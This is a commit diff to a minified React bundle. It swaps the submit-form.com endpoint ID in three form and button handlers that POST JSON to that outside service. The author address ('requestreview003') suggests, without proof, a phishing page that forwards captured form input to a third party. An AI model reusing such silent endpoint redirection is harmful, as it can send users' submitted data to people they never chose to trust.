65c44c7f38d36d03963ceb99ec97045718636744
sklound <requestreview003@gmail.com>
2025-05-29 20:35:56 +0500

    Update main.be179052.js

--- main.be179052.js
+++ main.be179052.js
@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/3cdKOQ48I", {
+                                    fetch("https://submit-form.com/vOlNxGRqG", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/3cdKOQ48I", {
+                                    u && o ? (fetch("https://submit-form.com/vOlNxGRqG", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/3cdKOQ48I", {
+                        fetch("https://submit-form.com/vOlNxGRqG", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
